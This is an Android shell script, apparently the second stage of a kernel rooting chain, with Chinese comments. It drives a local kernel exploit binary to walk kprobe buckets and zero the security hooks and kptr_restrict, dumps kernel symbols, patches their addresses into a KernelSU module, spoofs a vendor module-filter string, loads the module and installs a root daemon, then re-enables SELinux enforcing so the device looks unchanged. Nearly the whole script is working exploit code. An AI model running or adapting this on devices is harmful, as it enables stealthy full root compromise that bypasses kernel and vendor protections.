#!/system/bin/sh
# phaseB.sh —— 读 targets.txt（主机已算好全部地址），本地完成：
#   摘钩子+清kptr → 导出kallsyms → 补丁KO → insmod → install → setenforce 1
D=/data/local/tmp
cd $D || exit 1
LOG=$D/phaseB.log
: > $LOG
echo "=== phaseB $(date +%H:%M:%S) ===" >> $LOG
[ -f $D/targets.txt ] || { echo NO_TARGETS; exit 2; }

TB=""; TKO=""; TSY=""; TLM=""; HKO=""; HSY=""; HLM=""; KPTR=""; PARA=""; SLIDE=""
while IFS='=' read k v; do
  case "$k" in
    TABLE) TB=$v;; TKO) TKO=$v;; TSY) TSY=$v;; TLM) TLM=$v;;
    HKO) HKO=$v;; HSY) HSY=$v;; HLM) HLM=$v;;
    KPTR) KPTR=$v;; PARA) PARA=$v;; SLIDE) SLIDE=$v;;
  esac
done < $D/targets.txt

norm() { printf '%x' $(( $1 )) 2>/dev/null; }
rd() {
  o=$(./libroot.so su -c "sh $D/rk.sh $1" 2>/dev/null | sed -n 's/.* a=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1)
  [ -n "$o" ] && norm $o
}
zs() {
  rm -f $D/zb.log
  CVE98260_LOG=$D/zb.log CVE98260_ZERO_SYMS="$1" CVE98260_SELINUX_ONLY=1 PLANT_FAST=1 \
    nohup timeout -k 5 200 $D/libroot.so exploit --slide $SLIDE \
    --page-offset 0xffffff7f80000000 < $D/cve98260/profile.framed >/dev/null 2>&1 &
  i=0; while [ $i -lt 120 ]; do grep -qa parked $D/zb.log 2>/dev/null && break; sleep 1; i=$((i+1)); done
  pkill -9 -f 'libroot.so exploit' 2>/dev/null; sleep 1
}

# ---- 1) 走 3 个桶，摘 pre_handler ----
VICT=""
walk() { # walk <bucket_head_addr> <target_norm>
  node=$(rd "$1"); n=0
  while [ -n "$node" ] && [ "$node" != "0" ] && [ $n -lt 40 ]; do
    a=$(rd $(printf '0x%x' $(( 0x$node + 0x28 ))))
    if [ "$a" = "$2" ]; then
      p=$(rd $(printf '0x%x' $(( 0x$node + 0x40 ))))
      [ -n "$p" ] && [ "$p" != "0" ] && VICT="$VICT$(printf '0x%x' $(( 0x$node + 0x40 ))),"
    fi
    node=$(rd $(printf '0x%x' $(( 0x$node ))))
    n=$((n+1))
  done
}
walk "$HKO" "$(norm $TKO)"
walk "$HSY" "$(norm $TSY)"
walk "$HLM" "$(norm $TLM)"
echo "victims=$VICT" >> $LOG

Z=""
for a in $(echo "$VICT" | tr ',' ' '); do
  Z="$Z$(printf '0x%x' $(( $a - SLIDE ))),"
done
Z="$Z$KPTR,$PARA"
zs "$Z"
echo "kptr=$(cat /proc/sys/kernel/kptr_restrict)" >> $LOG

# ---- 2) 导出 kallsyms ----
./libroot.so su -c "cat /proc/kallsyms > $D/ksym.txt; chmod 644 $D/ksym.txt" 2>/dev/null
case "$(head -1 $D/ksym.txt | cut -d' ' -f1)" in
  0000000000000000) echo MASKED >> $LOG; echo MASKED; exit 3;;
esac

# ---- 3) 补丁 KO ----
cp -f $D/ksu-final.ko $D/ksu_v.ko
awk -v want="$(cut -d' ' -f1 $D/patch_table.txt | tr '\n' ' ')" '
  BEGIN{n=split(want,a," "); for(i=1;i<=n;i++) w[a[i]]=1}
  $3 in w {print $3, $1}' $D/ksym.txt > $D/sym_addr.txt

while read name addr; do
  off=$(awk -v n="$name" '$1==n{print $2; exit}' $D/patch_table.txt)
  [ -z "$off" ] && continue
  esc=$(awk -v v="$addr" 'BEGIN{v=v+0;s="";for(i=0;i<8;i++){b=int(v/(2^(8*i)))%256;s=s sprintf("\\%03o",b)}printf "%s",s}')
  printf "%b" "$esc" | dd of=$D/ksu_v.ko bs=1 seek=$((off+8)) conv=notrunc 2>/dev/null
  printf '\361\377' | dd of=$D/ksu_v.ko bs=1 seek=$((off+6)) conv=notrunc 2>/dev/null
done < $D/sym_addr.txt

MO=$(grep -abo 'scmversion=g0c0fdb960178' $D/ksu_v.ko 2>/dev/null | head -1 | cut -d: -f1)
[ -n "$MO" ] && printf 'vivo_module_filter=auto\0\0' | dd of=$D/ksu_v.ko bs=1 seek=$MO conv=notrunc 2>/dev/null
echo "patched resolved=$(wc -l < $D/sym_addr.txt)" >> $LOG

# ---- 4) insmod + install ----
R=$(./libroot.so su -c "cd $D; insmod ksu_v.ko allow_shell=1; echo rc=\$?; grep -i kernelsu /proc/modules" 2>&1)
echo "insmod: $R" >> $LOG
if echo "$R" | grep -qi kernelsu; then
  ./libroot.so su -c "/data/adb/ksud install" >/dev/null 2>&1
  ./libroot.so su -c "setenforce 1" >/dev/null 2>&1
  echo "SU: $(su -c 'id; getenforce' 2>&1 | head -2)" >> $LOG
  echo OK
else
  echo INSMOD_FAIL
fi
tail -10 $LOG
